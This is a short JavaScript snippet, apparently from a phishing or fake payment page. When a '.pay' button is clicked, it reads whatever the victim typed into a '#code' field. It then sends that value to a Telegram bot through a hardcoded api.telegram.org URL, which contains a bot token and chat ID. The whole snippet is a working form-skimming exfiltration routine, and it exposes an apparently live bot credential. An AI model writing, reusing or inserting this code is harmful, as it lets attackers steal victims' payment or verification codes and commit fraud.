

let but = document.querySelector(".pay")


but.addEventListener("click", (e) => {
  var code = document.querySelector("#code").value


  
  var token = "6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA"
    var chatid = -4071018603
    var mytext = `Results: %0A Code=${code} `
  
  var url = ` https://api.telegram.org/bot6907068275:AAHajtrtMi-hrziv3XBKd2LvfInnfNcN8AA/sendMessage?chat_id=-4071018603&text=${mytext}`


  async function logdata() {
    const response = await fetch(url);
    const data = await response.json();
  }



  logdata()

})


